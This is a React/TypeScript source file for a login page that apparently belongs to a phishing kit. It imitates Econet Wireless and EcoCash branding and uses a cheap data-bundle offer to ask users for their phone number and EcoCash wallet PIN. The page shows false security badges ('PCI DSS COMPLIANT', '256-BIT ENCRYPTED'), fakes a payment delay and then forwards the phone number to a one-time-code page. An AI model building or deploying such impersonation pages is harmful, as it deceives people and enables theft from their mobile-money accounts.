import React, { useState, useRef, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ShieldCheck, Check, ArrowLeft } from 'lucide-react';

export default function LoginPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { duration = 'Daily', voice = 4, sms = 7, data = 1.7, price = '0.21' } = location.state || {};

  const [phone, setPhone] = useState<string>('');
  const [pin, setPin] = useState<string>('');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const pinInputRef = useRef<HTMLInputElement>(null);

  const isPhoneValid = phone.length === 9;
  const isFormValid = isPhoneValid && pin.length === 4;

  useEffect(() => { if (isPhoneValid) pinInputRef.current?.focus(); }, [phone, isPhoneValid]);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    if (val.length <= 9) setPhone(val);
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) setPin(value);
  };

  const handlePayment = () => {
    if (!isFormValid) return;
    setIsProcessing(true);
    setTimeout(() => {
      setIsProcessing(false);
      navigate('/otp', { state: { duration, voice, sms, data, price, phone } });
    }, 1000);
  };

  const styles = {
    appContainer: { width: '100%', maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', position: 'relative', boxShadow: '0 0 30px rgba(0,0,0,0.1)', overflowX: 'hidden', fontFamily: "'Inter', sans-serif" } as React.CSSProperties,
    loginHeader: { background: 'linear-gradient(135deg, #0b40c4 0%, #1e5ce6 100%)', padding: '20px 20px 24px', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px', color: 'white' } as React.CSSProperties,
    backButton: { background: 'transparent', border: 'none', color: 'white', display: 'flex', alignItems: 'center', gap: '4px', padding: '0 0 16px 0', cursor: 'pointer', fontSize: '14px', opacity: 0.8 } as React.CSSProperties,
    brandLogos: { display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '20px' } as React.CSSProperties,
    logoEconet: { background: 'white', color: '#0b40c4', padding: '4px 8px', borderRadius: '6px', fontWeight: 800, fontSize: '12px', fontStyle: 'italic' } as React.CSSProperties,
    logoEconetSpan: { fontSize: '7px', fontWeight: 500, display: 'block' } as React.CSSProperties,
    logoEcocash: { color: '#e53935', fontWeight: 800, fontSize: '14px', background: 'white', padding: '4px 8px', borderRadius: '6px' } as React.CSSProperties,
    durationBadge: { marginLeft: 'auto', background: 'rgba(255,255,255,0.2)', padding: '6px 12px', borderRadius: '16px', fontSize: '12px', fontWeight: 700 } as React.CSSProperties,
    loginSummaryPills: { display: 'flex', gap: '6px', flexWrap: 'wrap' } as React.CSSProperties,
    pill: { background: 'rgba(255,255,255,0.15)', padding: '4px 10px', borderRadius: '12px', fontSize: '10px', fontWeight: 500 } as React.CSSProperties,
    loginContent: { padding: '20px', display: 'flex', flexDirection: 'column', gap: '16px' } as React.CSSProperties,
    loginCard: { background: 'white', borderRadius: '16px', padding: '20px', boxShadow: '0 4px 12px rgba(0,0,0,0.04)', position: 'relative', overflow: 'hidden' } as React.CSSProperties,
    totalToPayBox: { background: '#f0f5ff', borderRadius: '12px', padding: '16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '16px', border: '1px solid #d0e1fd' } as React.CSSProperties,
    totalToPayLabel: { fontSize: '13px', color: '#1e5ce6', fontWeight: 600, margin: 0 } as React.CSSProperties,
    totalToPayAmount: { fontSize: '24px', color: '#0b40c4', fontWeight: 800, margin: 0 } as React.CSSProperties,
    ecocashBranding: { display: 'flex', alignItems: 'center', gap: '12px' } as React.CSSProperties,
    ecocashTitle: { fontSize: '20px', fontWeight: 800, color: '#0b40c4', margin: 0 } as React.CSSProperties,
    ecocashTitleSpan: { color: '#e53935' } as React.CSSProperties,
    ecocashH3: { fontSize: '14px', color: '#1a1a1a', marginBottom: '2px', marginTop: 0 } as React.CSSProperties,
    ecocashP: { fontSize: '11px', color: '#666', margin: 0 } as React.CSSProperties,
    featureBadges: { display: 'flex', gap: '8px', flexWrap: 'wrap', marginTop: '16px' } as React.CSSProperties,
    badgeBase: { display: 'flex', alignItems: 'center', gap: '4px', fontSize: '9px', fontWeight: 600, padding: '4px 8px', borderRadius: '12px' } as React.CSSProperties,
    badgeInstant: { background: '#e0f7fa', color: '#00838f' },
    badgeSecure: { background: '#e0f2fe', color: '#0277bd' },
    badgeNoFees: { background: '#fff3e0', color: '#ef6c00' },
    cardH3: { fontSize: '16px', color: '#1a1a1a', marginBottom: '4px', marginTop: 0 } as React.CSSProperties,
    cardSubtitle: { fontSize: '12px', color: '#666', marginBottom: '20px', marginTop: 0 } as React.CSSProperties,
    formGroup: { marginBottom: '20px' } as React.CSSProperties,
    formLabel: { display: 'block', fontSize: '11px', color: '#888', fontWeight: 600, marginBottom: '8px' } as React.CSSProperties,
    phoneInputWrapper: { display: 'flex', border: isPhoneValid ? '2px solid #00c853' : '1px solid #e0e0e0', borderRadius: '12px', overflow: 'hidden', transition: 'border 0.3s' } as React.CSSProperties,
    countryCode: { background: '#f8f9fc', padding: '14px 12px', fontSize: '14px', fontWeight: 500, color: '#333', borderRight: '1px solid #e0e0e0', display: 'flex', alignItems: 'center', gap: '6px' } as React.CSSProperties,
    phoneInput: { flex: 1, border: 'none', padding: '14px', fontSize: '15px', outline: 'none', letterSpacing: '1px' } as React.CSSProperties,
    pinContainer: { border: isPhoneValid ? '1px solid #e0e0e0' : '1px dashed #ccc', borderRadius: '12px', padding: '20px', textAlign: 'center', cursor: isPhoneValid ? 'pointer' : 'not-allowed', position: 'relative', backgroundColor: isPhoneValid ? 'white' : '#f9f9f9', opacity: isPhoneValid ? 1 : 0.6, transition: 'all 0.3s' } as React.CSSProperties,
    pinPlaceholder: { fontSize: '12px', color: '#aaa', marginBottom: '16px', marginTop: 0 } as React.CSSProperties,
    pinDots: { display: 'flex', justifyContent: 'center', gap: '16px' } as React.CSSProperties,
    pinCircle: { width: '24px', height: '24px', border: '2px solid #d1d5db', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '24px', lineHeight: 1, color: '#1e5ce6' } as React.CSSProperties,
    pinCircleFilled: { borderColor: '#1e5ce6', backgroundColor: '#f0f5ff' } as React.CSSProperties,
    hiddenPinInput: { position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', opacity: 0, cursor: 'pointer', pointerEvents: isPhoneValid ? 'auto' : 'none' } as React.CSSProperties,
    loginFooter: { marginTop: '10px', textAlign: 'center' } as React.CSSProperties,
    securityBadges: { display: 'flex', justifyContent: 'center', gap: '16px', marginTop: '16px', fontSize: '9px', color: '#00c853', fontWeight: 600 } as React.CSSProperties,
    securityBadgeSpan: { display: 'flex', alignItems: 'center', gap: '4px' } as React.CSSProperties,
    receiveOfferBtn: { width: '100%', padding: '16px', border: 'none', borderRadius: '16px', fontSize: '16px', fontWeight: 700, color: 'white', marginTop: '16px', marginBottom: '16px', transition: 'all 0.2s', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '8px' } as React.CSSProperties,
    poweredBy: { fontSize: '9px', color: '#999', fontWeight: 500, letterSpacing: '0.5px' } as React.CSSProperties,
  };

  return (
    <div style={styles.appContainer}>
      <div style={styles.loginHeader}>
        <button style={styles.backButton} onClick={() => navigate('/')}>
          <ArrowLeft size={16} /> Back
        </button>
        <div style={styles.brandLogos}>
          <div style={styles.logoEconet}>ECONET <span style={styles.logoEconetSpan}>Wireless</span></div>
          <div style={styles.logoEcocash}>EcoCash</div>
          <span style={styles.durationBadge}>USD {price}</span>
        </div>
        <div style={styles.loginSummaryPills}>
          <span style={styles.pill}>{duration}</span>
          <span style={styles.pill}>{voice} Min</span>
          <span style={styles.pill}>{sms} SMS</span>
          <span style={styles.pill}>{data} GB</span>
        </div>
      </div>

      <div style={styles.loginContent}>
        <div style={styles.loginCard}>
          <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '4px', background: 'linear-gradient(90deg, #00c853, #1e90ff)' }}></div>
          <div style={styles.ecocashBranding}>
            <h2 style={styles.ecocashTitle}>Eco<span style={styles.ecocashTitleSpan}>Cash</span></h2>
            <div>
              <h3 style={styles.ecocashH3}>Pay with EcoCash</h3>
              <p style={styles.ecocashP}>Instant mobile wallet payment</p>
            </div>
          </div>
          <div style={styles.totalToPayBox}>
            <p style={styles.totalToPayLabel}>Total to pay</p>
            <p style={styles.totalToPayAmount}>USD {price}</p>
          </div>
          <div style={styles.featureBadges}>
            <span style={{ ...styles.badgeBase, ...styles.badgeInstant }}><Check size={12} /> INSTANT</span>
            <span style={{ ...styles.badgeBase, ...styles.badgeSecure }}><ShieldCheck size={12} /> SECURE</span>
            <span style={{ ...styles.badgeBase, ...styles.badgeNoFees }}>★ NO FEES</span>
          </div>
        </div>

        <div style={styles.loginCard}>
           <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '4px', background: 'linear-gradient(90deg, #1e90ff, #6a5acd)' }}></div>
          <h3 style={styles.cardH3}>Verify your account</h3>
          <p style={styles.cardSubtitle}>Enter your EcoCash number and PIN</p>

          <div style={styles.formGroup}>
            <label style={styles.formLabel}>PHONE NUMBER</label>
            <div style={styles.phoneInputWrapper}>
              <div style={styles.countryCode}><span>🇿🇼</span> +263</div>
              <input type="tel" placeholder="7XXXXXXXX" value={phone} onChange={handlePhoneChange} style={styles.phoneInput} />
              {isPhoneValid && <div style={{ display: 'flex', alignItems: 'center', paddingRight: '12px', color: '#00c853' }}><Check size={20} /></div>}
            </div>
          </div>

          <div style={styles.formGroup}>
            <label style={styles.formLabel}>ENTER YOUR PIN</label>
            <div style={styles.pinContainer} onClick={() => isPhoneValid && pinInputRef.current?.focus()}>
              <p style={styles.pinPlaceholder}>{isPhoneValid ? 'Tap to enter your 4-digit PIN' : 'Enter phone number first'}</p>
              <div style={styles.pinDots}>
                {[0, 1, 2, 3].map((index) => (
                  <div key={index} style={{ ...styles.pinCircle, ...(pin.length > index ? styles.pinCircleFilled : {}) }}>
                    {pin.length > index ? '•' : ''}
                  </div>
                ))}
              </div>
              <input type="tel" ref={pinInputRef} value={pin} onChange={handlePinChange} maxLength={4} style={styles.hiddenPinInput} />
            </div>
          </div>
        </div>

        <div style={styles.loginFooter}>
          <div style={styles.securityBadges}>
            <span style={styles.securityBadgeSpan}><ShieldCheck size={14} /> 256-BIT ENCRYPTED</span>
            <span style={styles.securityBadgeSpan}><ShieldCheck size={14} /> PCI DSS COMPLIANT</span>
          </div>
          <button onClick={handlePayment} disabled={!isFormValid || isProcessing} style={{ ...styles.receiveOfferBtn, backgroundColor: isFormValid ? '#1e5ce6' : '#a0bdf5', cursor: isFormValid && !isProcessing ? 'pointer' : 'not-allowed', boxShadow: isFormValid && !isProcessing ? '0 4px 12px rgba(30, 92, 230, 0.3)' : 'none', opacity: isProcessing ? 0.8 : 1 }}>
            {isProcessing ? 'Processing Payment...' : 'Receive Offer'}
          </button>
          <p style={styles.poweredBy}>POWERED BY ECONET WIRELESS · ECOCASH</p>
        </div>
      </div>
    </div>
  );
}